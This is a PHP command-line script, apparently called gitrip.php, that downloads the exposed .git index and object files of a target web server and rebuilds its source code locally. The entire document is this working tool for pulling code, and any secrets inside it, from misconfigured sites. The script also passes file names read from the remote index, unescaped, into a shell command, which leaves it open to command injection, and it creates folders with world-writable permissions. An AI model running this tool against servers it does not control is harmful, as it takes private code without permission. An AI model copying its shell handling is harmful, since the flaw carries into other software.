<?php
function printLine($text)
{
  echo $text . PHP_EOL;
}

if(isset($argv[1], $argv[2]) === false) {
  printLine('Invalid');
  printLine('Example:');
  printLine('php ./gitrip.php http://localhost:8080/.git/index ./build');
  exit;
}
list(,$targetRepoUrl, $buildPath) = $argv;
printline('Trying to get index of ' . $targetRepoUrl);
$handle = fopen($targetRepoUrl, 'r');
if(is_resource($handle) === false)
{
  printLine('Could not open index file on remote');
  exit;
}
/**
 * Make build folder and init git
 */
if(is_dir($buildPath) === false)
{
  mkdir($buildPath.'/.git/', 0777, true); // @todo reconsider perms
}
$targetIndex = $buildPath . '/.git/index';
/**
 * Remove any created index file
 */
if(file_exists($targetIndex === false))
{
  unlink($targetIndex);
}
/**
 * Add a index file matching the remote
 */
file_put_contents($targetIndex, $handle);
fclose($handle);
/**
 * Change dir to buildPath and call git init
 */
chdir($buildPath);
`git init`;
/**
 * Get the git index
 */
$lsIndex = `git ls-files -s`;
/**
 * Prepare assoc array for parsed data from git index
 */
$remoteObjects = [ 'sha1' => [],
    'folder' => [],
    'file' => [],
    'filename' => []
];

/**
 * Parse and build data in prepared assoc array
 */
$i = 0;
foreach(explode("\n", $lsIndex) as $line)
{
  if(empty($line))
  {
    continue;
  }
  $pattern = '/\s{1}((\w{2})(\w{38})).+\s+(.+)/';
  preg_match($pattern, $line, $match);
  $remoteObjects['sha1'][$i] = $match[1];
  $remoteObjects['folder'][$i] = $match[2];
  $remoteObjects['file'][$i] = $match[3];
  $remoteObjects['filename'][$i] = $match[4];
  ++$i;
}
/**
 * Fetch files from remote rpo and convert files
 * into source code in the build path
 */
$i = 0;
foreach($remoteObjects['sha1'] as $object)
{
  /**
   * Get the remote object
   */
  $remoteObjectUri = $targetRepoUrl.'/../objects/'.$remoteObjects['folder'][$i].'/'. $remoteObjects['file'][$i];
  $objectHandler = fopen($remoteObjectUri, 'r');
  if(is_resource($objectHandler) === false)
  {
    ++$i;
    continue;
  }
  /**
   * Save the object file in the buildpath
   */
  $newObject = './.git/objects/'.$remoteObjects['folder'][$i].'/'.$remoteObjects['file'][$i];
  /**
   * Refresh any already retrieved object or
   * save object path and object
   */
  if(file_exists($newObject))
  {
    unlink($newObject);
  }
  else
  {
    /**
     * Make if missing
     */
    if(is_dir('./.git/objects/'.$remoteObjects['folder'][$i]) === false)
    {
      mkdir('./.git/objects/'.$remoteObjects['folder'][$i], 755, true);
    }
  }
  /**
   * Save the object
   */
  file_put_contents($newObject, $objectHandler);
  fclose($objectHandler);
  /**
   * Rebuild from object files
   */
  $sha1 = $remoteObjects['sha1'][$i];
  $fileInfo = pathinfo($remoteObjects['filename'][$i]);
  $filename = $remoteObjects['filename'][$i];
  if($fileInfo['dirname'] !== '.')
  {
    if(is_dir($buildPath.'/'.$fileInfo['dirname']) === false)
    {
      mkdir($buildPath . '/' . $fileInfo['dirname'], 0777, true); // @todo reconsider permission
    }
  }
  $content  = `git cat-file -p $sha1 > $filename`;
  ++$i;
}

echo PHP_EOL . 'Success' . PHP_EOL;
